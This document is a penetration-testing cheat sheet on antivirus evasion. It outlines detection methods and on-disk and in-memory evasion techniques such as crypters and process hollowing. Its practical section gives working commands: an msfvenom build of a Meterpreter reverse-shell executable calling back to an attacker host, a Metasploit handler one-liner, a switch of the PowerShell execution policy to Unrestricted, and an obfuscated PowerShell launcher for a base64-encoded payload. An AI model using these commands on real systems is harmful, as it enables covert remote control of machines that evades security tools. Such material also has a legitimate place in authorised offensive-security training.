# AV Evasion

### Methods of Detecting Malicious Code

**Signature-Based Detection**

* Identifies known malware based on predefined signatures.

**Heuristic-Based Detection**

* Analyzes the behavior of code to identify potential threats based on heuristics.

**Behavioral-Based Detection**

* Examines the behavior of code during execution to identify suspicious activities.

#### ON-Disk Evasion

**Packers**

* Tools that compress or encrypt executable files to obfuscate their content.

**Obfuscators**

* Techniques that obscure the code's logic and structure to make it harder to analyze.

**Crypters**

* Tools that encrypt executable files to evade signature-based detection.

**Software Protectors**

* Programs that protect executable files from analysis and tampering.

#### In-Memory Evasion

**Remote Process Memory Injection**

* Injecting code into the memory space of a remote process.

**Reflective DLL Injection**

* Loading a DLL into a process's memory without putting it on disk.

**Process Hollowing**

* Creating a new suspended process and replacing its memory space with malicious code.

**Inline Hooking**

* Modifying function pointers to redirect execution flow.

#### Practical

**Manual**

*   **Simple Reverse Shell Binary:**

    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f exe > binary.exe
    ```
*   **PowerShell ExecutionPolicy:**

    ```powershell
    powershell Get-ExecutionPolicy -Scope CurrentUser
    powershell Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
    powershell Get-ExecutionPolicy -Scope CurrentUser
    ```
*   **Metasploit One-Line Command:**

    ```bash
    msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LPORT 4444; set LHOST 192.168.1.6"
    ```
*   **PowerShell AV Bypass Payload:**

    ```powershell
    $jHs = '<BASE64_ENCODED_PAYLOAD>'
    $e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($jHs))
    $TmU = "-e "
    if([IntPtr]::Size -eq 8){
        $YZfX = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell"
        iex "& $YZfX $TmU $e"
    } else {
        iex "& powershell $TmU $e"
    }
    ```

**Tools**

* **Shelter:**
  * A tool for binary analysis and evasion.
* **TheFatRat:**
  * An easy-to-use tool for generating backdoors with evasion capabilities.
* **Empire:**
  * A PowerShell and Python post-exploitation framework with AV evasion features.
* **Veil:**
  * A framework for generating various types of shellcode, including evasion techniques.
